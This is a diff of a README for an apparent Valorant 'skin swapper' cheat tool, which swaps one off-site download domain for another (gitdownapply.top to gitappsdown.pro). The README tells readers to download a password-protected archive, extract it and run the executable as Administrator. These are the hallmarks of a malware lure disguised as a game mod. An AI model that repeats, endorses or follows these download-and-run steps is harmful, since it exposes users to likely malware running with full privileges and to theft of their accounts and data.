@@ -6,7 +6,7 @@ Valorant external skin swapper with real-time skin switching, knife models, agen
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -78,7 +78,7 @@ Based on community tools like `valorant-menu-swapper`, `ValorantSkinStyler`, and
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download the archive.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download the archive.
 2. Extract the files to a folder on your desktop.
 3. Run the executable **as Administrator**.
 4. Select your desired weapon skin or cosmetic.
